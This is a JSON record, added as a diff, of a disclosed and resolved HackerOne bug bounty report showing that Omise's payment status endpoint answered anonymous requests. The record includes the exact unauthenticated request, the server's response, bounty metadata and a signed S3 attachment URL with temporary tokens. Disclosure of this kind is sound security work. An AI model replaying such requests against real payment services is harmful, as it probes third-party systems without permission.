@@ -1,0 +1,135 @@
+{
+  "id": 1546726,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTQ2NzI2",
+  "url": "https://hackerone.com/reports/1546726",
+  "title": "Anonymous access control - Payments Status",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2022-04-21T11:10:23.666Z",
+  "submitted_at": "2022-04-21T11:10:23.742Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "codeslayer1337",
+    "url": "/codeslayer1337",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/v6fcs9k6nxzscaei3wo5fcpqfbnt/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 21045,
+    "url": "https://hackerone.com/omise",
+    "handle": "omise",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/nm9gwmg377pece9jzkjw5k1o7tm7/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/nm9gwmg377pece9jzkjw5k1o7tm7/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Omise",
+      "twitter_handle": "omise",
+      "website": "https://www.omise.co",
+      "about": "Next generation of payment Platform"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2022-08-07T01:59:29.530Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-07-08T01:59:22.656Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nFound on the Payments Status function website, it can be accessed anonymously. payment status should only be accessible by accounts that make payments in a state that has successfully logged in.\n\n## Steps To Reproduce:\naccess anonymously (without logging in) to the payment status function as in the example below\n\n  1. Request:\nGET /payments/paym_test_5rjz482tky43reoil9f/status HTTP/2\nHost: api.omise.co\nSec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\"\nSec-Ch-Ua-Mobile: ?0\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36\nSec-Ch-Ua-Platform: \"macOS\"\nAccept: */*\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://api.omise.co/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\n\n2. Response:\nHTTP/2 200 OK\nDate: Thu, 21 Apr 2022 10:57:37 GMT\nContent-Type: application/json; charset=utf-8\nContent-Length: 18\nX-Download-Options: noopen\nX-Permitted-Cross-Domain-Policies: none\nReferrer-Policy: strict-origin\nCache-Control: no-cache, no-store\nEtag: W/\"c9e654e8902aa47de7edcd7ab902ed16\"\nSet-Cookie: locale=en; path=/\nX-Request-Id: 26180027472066089\nStrict-Transport-Security: max-age=31536000; includeSubDomains\n\n{\"processed\":true}\n\n## Impact\n\nAttackers can see payment status on the account's website without having to log in (anonymous)\n\nBest regards,\n\n\nCodeSlayer137",
+  "bounty_amount": "100.0",
+  "formatted_bounty": "$100",
+  "weakness": {
+    "id": 26,
+    "name": "Improper Access Control - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1701616,
+      "file_name": "Screen_Shot_2022-04-21_at_18.09.49.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/8fh6x21n0w3o52t2r72zxb77p2nx?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2022-04-21_at_18.09.49.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2022-04-21_at_18.09.49.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2C5LCWPJ%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T215757Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDRfIf7p%2BzB84l2H%2BvTveuAllNHw3AQwpkferefiRqrKwIhALmpXT6p7j1ejFaXcC2L9M%2BeXd%2B5%2FMpLBbddxg1D%2FkX3KrsFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igyy4PU6LPl7zC%2BIYCMqjwUqyD3Gtagvz456amGT%2FdlSEs3qr5mIo7ufyYryGf0mR%2FZIYvvGBwa6I4Xv%2Bf2RExNRWL1PEBasTqXmjnSNE6Njx4NM6lQehtQhCkLNtVpvk9mxuDWol%2F%2Bd9X99J5HgfFTvTIK0sND5OdwK2Xii7TAU89d1wXsNIAeBxeEDxFXeNehRjTj8%2BP5qOgeKwO0ilW4tzaQrKo4vmNb0b0OXzJeHaOk5BfIaf8mekXGLvXUbQpZVDg%2BQV%2FG0BVNOXB2Ssg7CLKeJpVi3KXUk8I3p5NHbKNjSwtxsQwiAk77EzG%2BjFjrnJc%2FXosrh6bw%2BkYmNMWoG4e8aXiBxqswo85upElPRefvj0X4i5ksfIzFHxJ6mTE%2FfrMa8NLCdJiDHdhdLcayvQshQhnASmWjx9IXAly6esRF0lWV1WqMNbvioXbS1j6TaXFCzBhav8eXgJ1mjvZZOYw9twxC4gen6fVCjRVL27MiPT0CtoJo9TSej4gKA6SuQ1kxpquOTL6un7G1HXjRYlN%2BWfFtYGEMiAtOU3%2Br0VEJjcSEqfC2uBF2WtCciZ6h1V75%2FfOjEfPED%2BlUqBFDZBRUb6TDCvqxVh4RzQLWHlt5xKII%2B4YlutXBtzQ4m8JlEY7CxA8UlJfCyhcuQHF1kLjk4SWqV8JclDRdNXYAq42jih52Mbx1wBCDVEGwHnifQGBKoka6ArQtQ9l9lwAyNoKaBL9bmAfEXY2IY%2BSdIIJfMjrQHLjCwd6%2BHKEkS7cn7Go8VnsSSNZvaEyBQW%2BeXeD%2BXePUEd8eJeyVV14Q71Akogq%2BZW7QabybvPQdDL949VfHBi%2BhlrtSWq%2Fs5oUjgKUdiEM2eQ3dcnyouTyh5e%2B%2FHBxonwl9UBzmWdO9eMM%2FH4swGOrABdvcTMAy7%2FX5QI0FWQY77Fy6VatG6FqLZVm2BH780w05CdAQ6XHdzoNstEpm1e4DJqivADaRF%2F37TV9nnX1a0PlypiNAVMFuCoQIp3eBQGK8Y%2FYI%2FL%2BHWW25L%2FRU8Yqh9Rkx8cYD%2BTLMImqaG8uvgOuMBhubbhdxvh83NJbTZl2NnkQpNG7Jqy%2BMyvAUTiYA19p%2FT6VqQFadaDqM2Ox6RShImGGVR1NdtIkxK7l1Om8w%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=813442d2cacaa7d68060e9a0b892a728cf8a2c3f2febd38a2a6c31cf6d03b7c5",
+      "file_size": 316977,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2022-08-07T01:59:22.720Z",
+  "allow_singular_disclosure_after": -111787114.51228952,
+  "singular_disclosure_allowed": true,
+  "vote_count": 26,
+  "voters": [
+    "m4khn0",
+    "kashsec",
+    "drsniper",
+    "zy9ard3",
+    "mr-k0anti",
+    "yassinek3ch",
+    "mohaned0101",
+    "h4x0r_dz",
+    "imtheking",
+    "pr0f0x01",
+    "and 16 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 22208,
+    "asset_type": "URL",
+    "asset_identifier": "link.omise.co",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
